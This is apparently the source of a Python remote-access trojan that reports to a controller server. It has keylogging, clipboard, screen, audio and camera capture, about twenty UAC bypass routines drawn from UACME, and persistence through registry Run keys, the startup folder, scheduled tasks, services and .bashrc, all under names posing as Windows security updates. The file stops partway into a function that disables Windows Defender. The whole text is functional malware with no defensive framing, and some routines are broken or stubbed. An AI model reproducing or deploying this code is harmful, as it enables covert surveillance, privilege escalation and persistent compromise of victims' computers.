import socketio
import requests
import time
import uuid
import os
import subprocess
import threading
import mss
import numpy as np
import cv2
import sys
import random
try:
    import win32api
    import win32con
    import win32clipboard
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
import pyaudio
import base64
import tempfile
import pynput
from pynput import keyboard, mouse
import pygame
import io
import wave
import socket
import json
import asyncio
import websockets
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
import psutil
from PIL import Image
import platform
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# --- WebSocket Client ---
sio = socketio.Client()

# --- Privilege Escalation Functions ---

def is_admin():
    """Check if the current process has admin privileges."""
    if WINDOWS_AVAILABLE:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.geteuid() == 0

def elevate_privileges():
    """Attempt to elevate privileges using various advanced methods."""
    if not WINDOWS_AVAILABLE:
        # For Linux/Unix systems
        try:
            if os.geteuid() != 0:
                # Try to use sudo if available
                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
                return True
        except:
            pass
        return False
    
    if is_admin():
        return True
    
    # Advanced UAC bypass methods (UACME-inspired)
    bypass_methods = [
        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
        bypass_uac_token_manipulation, # Method 35: Token manipulation
        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
        bypass_uac_com_handlers,       # Method 40: COM handler hijack
        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
        bypass_uac_mock_directory,     # Method 62: Mock directory technique
        bypass_uac_winsat,             # Method 67: winsat.exe bypass
        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
    ]
    
    for method in bypass_methods:
        try:
            if method():
                return True
        except Exception as e:
            print(f"UAC bypass method {method.__name__} failed: {e}")
            continue
    
    return False

def bypass_uac_cmlua_com():
    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        # Initialize COM
        pythoncom.CoInitialize()
        
        # Create elevated COM object
        # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
        try:
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            # Execute elevated command using ShellExec method
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            lua_util.ShellExec(current_exe, "", "", 0, 1)
            return True
            
        except Exception as e:
            print(f"ICMLuaUtil COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_fodhelper_protocol():
    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create protocol handler for ms-settings
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper to trigger bypass
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Fodhelper protocol bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_computerdefaults():
    """UAC bypass using computerdefaults.exe registry manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        print(f"Computerdefaults UAC bypass failed: {e}")
        return False

def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        pythoncom.CoInitialize()
        
        try:
            # First use ICMLuaUtil to set registry
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            # Set DisplayCalibrator registry value
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
            lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
            
            # Create IColorDataProxy COM object
            color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
            
            # Launch DCCW which will execute our payload
            color_proxy.LaunchDccw(0)
            
            return True
            
        except Exception as e:
            print(f"ColorDataProxy COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_dismcore_hijack():
    """UAC bypass using DismCore.dll hijacking (UACME Method 23)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create malicious DismCore.dll in temp directory
        temp_dir = tempfile.gettempdir()
        dismcore_path = os.path.join(temp_dir, "DismCore.dll")
        
        # Simple DLL that executes our payload
        dll_code = f'''
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        system("python.exe \"{os.path.abspath(__file__)}\"");
        break;
    }}
    return TRUE;
}}
'''
        
        # For demonstration, we'll use a different approach
        # Copy a legitimate system DLL and modify PATH
        system32_path = os.environ.get('SystemRoot', 'C:\Windows') + '\System32'
        
        # Add temp directory to PATH so pkgmgr.exe finds our DLL first
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute pkgmgr.exe which will load our DismCore.dll
            subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Restore PATH
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"DismCore hijack bypass failed: {e}")
        return False

def bypass_uac_wow64_logger():
    """UAC bypass using wow64log.dll hijacking (UACME Method 30)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method works by placing wow64log.dll in PATH
        # and executing a WOW64 process that will load it
        temp_dir = tempfile.gettempdir()
        
        # Add temp to PATH
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute a WOW64 process that will attempt to load wow64log.dll
            subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"WOW64 logger bypass failed: {e}")
        return False

def bypass_uac_silentcleanup():
    """UAC bypass using SilentCleanup scheduled task (UACME Method 34)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Modify windir environment variable temporarily
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake windir structure
        fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
        fake_system32 = os.path.join(fake_windir, "System32")
        os.makedirs(fake_system32, exist_ok=True)
        
        # Copy our payload as svchost.exe
        fake_svchost = os.path.join(fake_system32, "svchost.exe")
        
        # For Python script, create a batch wrapper
        batch_content = f'@echo off\n{current_exe}\n'
        with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
            f.write(batch_content)
        
        # Temporarily modify windir environment
        original_windir = os.environ.get('windir', 'C:\Windows')
        os.environ['windir'] = fake_windir
        
        try:
            # Execute SilentCleanup task
            subprocess.run([
                'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['windir'] = original_windir
            
    except Exception as e:
        print(f"SilentCleanup bypass failed: {e}")
        return False

def bypass_uac_token_manipulation():
    """UAC bypass using token manipulation (UACME Method 35)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Find an auto-elevated process to duplicate token from
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
                    # Get process handle
                    process_handle = win32api.OpenProcess(
                        win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
                        False,
                        proc.info['pid']
                    )
                    
                    # Get process token
                    token_handle = win32security.OpenProcessToken(
                        process_handle,
                        win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
                    )
                    
                    # Duplicate token
                    new_token = win32security.DuplicateTokenEx(
                        token_handle,
                        win32security.SecurityImpersonation,
                        win32security.TOKEN_ALL_ACCESS,
                        win32security.TokenPrimary
                    )
                    
                    # Create process with duplicated token
                    current_exe = os.path.abspath(__file__)
                    if current_exe.endswith('.py'):
                        current_exe = f'python.exe "{current_exe}"'
                    
                    si = win32process.STARTUPINFO()
                    pi = win32process.CreateProcessAsUser(
                        new_token,
                        None,
                        current_exe,
                        None,
                        None,
                        False,
                        0,
                        None,
                        None,
                        si
                    )
                    
                    win32api.CloseHandle(process_handle)
                    win32api.CloseHandle(token_handle)
                    win32api.CloseHandle(new_token)
                    win32api.CloseHandle(pi[0])
                    win32api.CloseHandle(pi[1])
                    
                    return True
                    
            except:
                continue
                
        return False
        
    except Exception as e:
        print(f"Token manipulation bypass failed: {e}")
        return False

def bypass_uac_junction_method():
    """UAC bypass using NTFS junction/reparse points (UACME Method 36)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create junction point to redirect DLL loading
        temp_dir = tempfile.gettempdir()
        junction_dir = os.path.join(temp_dir, "junction_target")
        
        # Create target directory
        os.makedirs(junction_dir, exist_ok=True)
        
        # Use mklink to create junction (requires admin, so this is simplified)
        try:
            subprocess.run([
                'cmd', '/c', 'mklink', '/J', 
                os.path.join(temp_dir, "fake_system32"),
                junction_dir
            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
            
    except Exception as e:
        print(f"Junction method bypass failed: {e}")
        return False

def bypass_uac_cor_profiler():
    """UAC bypass using .NET Code Profiler (UACME Method 39)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set environment variables for .NET profiler
        current_exe = os.path.abspath(__file__)
        
        # Create a fake profiler DLL path
        profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
        
        # Set profiler environment variables
        os.environ['COR_ENABLE_PROFILING'] = '1'
        os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
        os.environ['COR_PROFILER_PATH'] = profiler_path
        
        try:
            # Execute a .NET application that will load our profiler
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Clean up environment
            for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
                os.environ.pop(var, None)
                
    except Exception as e:
        print(f"COR profiler bypass failed: {e}")
        return False

def bypass_uac_com_handlers():
    """UAC bypass using COM handler hijacking (UACME Method 40)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Hijack COM handler for a file type
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake COM handler
        handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
        command_key = handler_key + r"\Shell\Open\Command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Trigger COM handler through mmc.exe
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"COM handlers bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_volatile_env():
    """UAC bypass using volatile environment variables (UACME Method 44)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Set volatile environment variable
        env_key = r"Environment"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(current_exe))
            winreg.CloseKey(key)
            
            # Execute auto-elevated process that uses environment variables
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "windir")
                winreg.CloseKey(key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Volatile environment bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_slui_hijack():
    """UAC bypass using slui.exe registry hijacking (UACME Method 45)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack slui.exe through registry
        key_path = r"Software\Classes\exefile\shell\open\command"
        
        try:
            # Backup original value
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                original_value = None
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute slui.exe
            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SLUI hijack bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_eventvwr():
    """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack mscfile association
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute eventvwr.exe
            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"EventVwr bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_sdclt():
    """UAC bypass using sdclt.exe (UACME Method 31)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack App Paths for control.exe
        key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute sdclt.exe which will call control.exe
            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SDCLT bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_wsreset():
    """UAC bypass using WSReset.exe (UACME Method 56)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack ActivatableClassId for WSReset
        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute WSReset.exe
            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"WSReset bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_appinfo_service():
    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method involves manipulating the Application Information service
        # to bypass UAC by modifying service permissions
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Method 1: Try to modify AppInfo service configuration
        try:
            # Stop AppInfo service temporarily
            subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Modify service binary path to include our payload
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Start service
            subprocess.run(['sc.exe', 'start', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            
            # Restore original service configuration
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            return True
            
        except:
            return False
            
    except Exception as e:
        print(f"AppInfo service bypass failed: {e}")
        return False

def bypass_uac_mock_directory():
    """UAC bypass using mock directory technique (UACME Method 62)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create mock trusted directory structure
        temp_dir = tempfile.gettempdir()
        mock_system32 = os.path.join(temp_dir, "System32")
        os.makedirs(mock_system32, exist_ok=True)
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_path = os.path.join(mock_system32, "dllhost.exe")
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\npython.exe "{current_exe}"\n')
        
        # Modify PATH to prioritize our mock directory
        original_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + original_path
        
        try:
            # Execute process that will search PATH for system executables
            subprocess.Popen(['dllhost.exe'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = original_path
            
    except Exception as e:
        print(f"Mock directory bypass failed: {e}")
        return False

def bypass_uac_winsat():
    """UAC bypass using winsat.exe (UACME Method 67)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack winsat.exe through registry
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute winsat.exe
            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Winsat bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_mmcex():
    """UAC bypass using mmc.exe with fake snapin (UACME Method 68)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake MMC snapin
        snapin_clsid = "{11111111-2222-3333-4444-555555555555}"  # Placeholder CLSID
        key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)
            
            # Create MSC file that references our snapin
            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<MMC_ConsoleFile ConsoleVersion="3.0">
    <BinaryStorage>
        <Binary Name="StringTable">
            <Data>
                <String ID="1" Refs="1">{snapin_clsid}</String>
            </Data>
        </Binary>
    </BinaryStorage>
</MMC_ConsoleFile>'''
            
            msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
            with open(msc_path, 'w') as f:
                f.write(msc_content)
            
            # Execute MMC with our fake snapin
            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                os.remove(msc_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"MMC snapin bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def establish_persistence():
    """Establish multiple persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return establish_linux_persistence()
    
    persistence_methods = [
        registry_run_key_persistence,
        startup_folder_persistence,
        scheduled_task_persistence,
        service_persistence,
    ]
    
    success_count = 0
    for method in persistence_methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            print(f"Persistence method {method.__name__} failed: {e}")
            continue
    
    return success_count > 0

def registry_run_key_persistence():
    """Establish persistence via registry Run keys."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Multiple registry locations for persistence
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        value_name = "WindowsSecurityUpdate"
        
        for hkey, key_path in run_keys:
            try:
                key = winreg.CreateKey(hkey, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry persistence failed: {e}")
        return False

def startup_folder_persistence():
    """Establish persistence via startup folder."""
    try:
        # Get startup folder path
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        
        current_exe = os.path.abspath(__file__)
        
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
            batch_path = os.path.join(startup_folder, "WindowsUpdate.bat")
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
        
        return True
        
    except Exception as e:
        print(f"Startup folder persistence failed: {e}")
        return False

def scheduled_task_persistence():
    """Establish persistence via scheduled tasks."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create scheduled task using schtasks command
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def service_persistence():
    """Establish persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', 'WindowsSecurityService',
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def establish_linux_persistence():
    """Establish persistence on Linux systems."""
    try:
        current_exe = os.path.abspath(__file__)
        
        # Method 1: .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\npython3 {current_exe} &\n")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"Linux persistence failed: {e}")
        return False

def disable_defender():
    """Attempt to disable Windows Defender (requires admin privileges)."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
